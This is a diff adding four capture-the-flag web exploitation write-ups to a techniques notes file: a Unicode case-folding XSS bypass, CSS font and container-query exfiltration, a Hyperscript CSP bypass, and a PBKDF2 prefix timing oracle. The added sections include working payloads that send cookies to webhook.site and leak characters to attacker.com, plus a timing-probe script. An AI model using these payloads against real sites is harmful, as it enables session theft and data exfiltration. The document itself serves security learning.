@@ -23,6 +23,10 @@
 - [JSFuck Decoding](#jsfuck-decoding)
 - [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
 - [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
+- [Unicode Case Folding XSS Bypass (UNbreakable 2026)](#unicode-case-folding-xss-bypass-unbreakable-2026)
+- [CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)
+- [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
+- [PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)](#pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026)
 
 ---
 
@@ -447,3 +451,94 @@ python3 -m http.server 8888
 **Key insight:** GraphQL GET requests bypass CORS preflight entirely — `new Image().src` triggers a simple GET that doesn't need `OPTIONS`. Combined with timing-based SQLi (`SLEEP()`), image `onerror` timing becomes a boolean oracle. The bot's localhost access turns a localhost-only SQLi into a remotely exploitable vulnerability.
 
 **Detection:** Chat/message features with HTML injection + admin bot + GraphQL endpoint with SQL injection + localhost-only restrictions.
+
+---
+
+## Unicode Case Folding XSS Bypass (UNbreakable 2026)
+
+**Pattern (demolition):** Server-side sanitizer (Flask regex `<\s*/?\s*script`) only matches ASCII. A second processing layer (Go `strings.EqualFold`) applies Unicode case folding, which canonicalizes `ſ` (U+017F, Latin Long S) to `s`.
+
+**Payload:**
+```html
+<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
+```
+
+**How it works:**
+1. Flask regex checks for `<script` — `<ſcript` does not match (ſ ≠ s in ASCII regex)
+2. Go's `strings.EqualFold` canonicalizes `ſ` → `s`, treating `<ſcript>` as `<script>`
+3. Frontend inserts via `innerHTML` — browser parses the now-valid script tag
+
+**Other Unicode folding pairs for bypass:**
+- `ſ` (U+017F) → `s` / `S`
+- `ı` (U+0131) → `i` / `I`
+- `ﬁ` (U+FB01) → `fi`
+- `K` (U+212A, Kelvin sign) → `k` / `K`
+
+**Key insight:** Different layers applying different normalization standards (ASCII-only regex vs. Unicode-aware case folding) create bypass opportunities. Check what processing each layer applies.
+
+---
+
+## CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)
+
+**Pattern (larpin):** Exfiltrate inline script content (e.g., `window.__USER_CONFIG__`) via CSS injection without JavaScript execution. Uses custom font glyph widths and CSS container queries as an oracle.
+
+**Technique:**
+1. **Target selection** — CSS selector targets inline script: `script:not([src]):has(+script[src*='purify'])`
+2. **Custom font** — Each character glyph has a unique advance width: `width = (char_index + 1) * 1536` font units
+3. **Container query oracle** — Wrapping element uses `container-type: inline-size`. Container queries match specific width ranges to trigger background-image requests:
+```css
+@container (min-width: 150px) and (max-width: 160px) {
+  .probe { background: url('https://attacker.com/?char=a&pos=0'); }
+}
+```
+4. **Per-character probing** — Iterate positions, each probe narrows to one character based on measured width
+
+**Key insight:** CSS container queries (no JavaScript needed) combined with custom font metrics create a pixel-perfect oracle for text content. Works even under strict CSP that blocks all scripts.
+
+---
+
+## Hyperscript CDN CSP Bypass (UNbreakable 2026)
+
+**Pattern (minegamble):** CSP allows `cdnjs.cloudflare.com` scripts. Hyperscript (`_hyperscript`) processes `_=` attributes client-side after HTML sanitization, enabling post-sanitization code execution.
+
+**Payload:**
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
+<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
+```
+
+**How it works:**
+1. HTML passes sanitizer (no inline script, no event handlers)
+2. Hyperscript library loads from CDN (allowed by CSP)
+3. Hyperscript scans DOM for `_=` attributes and executes them as behavioral directives
+4. `on load` triggers arbitrary actions including fetch, DOM manipulation, cookie access
+
+**Key insight:** Hyperscript, Alpine.js (`x-data`, `x-init`), htmx (`hx-get`, `hx-trigger`), and similar declarative JS frameworks execute code from HTML attributes that sanitizers don't recognize. If any CDN-hosted behavioral framework is CSP-allowed, it bypasses both CSP and HTML sanitizers.
+
+---
+
+## PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)
+
+**Pattern (svfgp):** Server checks `secret.startsWith(candidate)` where verification involves expensive PBKDF2 (3M iterations). Mismatches return fast; matches run the full KDF, creating a measurable timing difference.
+
+**Exfiltration via postMessage:**
+1. Open target page in a popup
+2. For each character position, probe all candidates (`a-z0-9_}`)
+3. Measure round-trip time via `postMessage` / response timing
+4. Highest-latency character = correct prefix match
+
+```javascript
+async function probeChar(known, candidates) {
+  const timings = {};
+  for (const c of candidates) {
+    const start = performance.now();
+    // Navigate popup to verification endpoint with candidate prefix
+    popup.location = `${TARGET}/verify?prefix=${known}${c}`;
+    await waitForResponse();  // postMessage or load event
+    timings[c] = performance.now() - start;
+  }
+  return Object.entries(timings).sort((a, b) => b[1] - a[1])[0][0];
+}
+```
+
+**Key insight:** Any expensive server-side operation (PBKDF2, bcrypt, Argon2) guarded by a short-circuit prefix check creates a timing oracle. The `startsWith` fast-fail vs. full-KDF timing difference is measurable cross-origin via popup navigation timing.
